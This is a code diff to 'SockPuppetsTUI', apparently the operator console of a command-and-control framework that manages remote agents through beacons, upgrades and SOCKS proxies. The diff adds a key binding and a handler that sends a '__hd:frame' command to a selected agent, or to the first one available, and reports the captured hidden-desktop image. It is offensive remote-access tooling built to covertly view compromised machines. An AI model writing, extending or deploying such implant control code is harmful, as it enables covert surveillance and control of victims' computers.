@@ -37,6 +37,7 @@ class SockPuppetsTUI(App):
         Binding("u", "upgrade_agent", "Upgrade"),
         Binding("d", "downgrade_agent", "Downgrade"),
         Binding("p", "socks_agent", "SOCKS"),
+        Binding("h", "desktop_agent", "Desktop"),
     ]
 
     def __init__(self, server, **kwargs):
@@ -160,6 +161,19 @@ class SockPuppetsTUI(App):
             result = await self.server.downgrade_to_beacon(agent_id, 60)
             self.query_one("#event-log", EventLogPanel).add_event("downgrade", result)
             self.refresh_agents()
+
+    async def action_desktop_agent(self):
+        agent_id = self._get_selected_agent_id()
+        if not agent_id:
+            agents = self.server.get_agent_list()
+            if agents:
+                agent_id = agents[0]["id"]
+        if not agent_id:
+            return
+        self.open_console(agent_id)
+        result = await self.server.send_command_to_agent(agent_id, "__hd:frame")
+        text = result if not str(result).startswith("HDIMG:") else f"desktop frame {len(result)} bytes"
+        self.console_tabs[agent_id].append(text, "white")
 
     async def action_generate(self):
         result = await self.push_screen_wait(GenerateDialog())
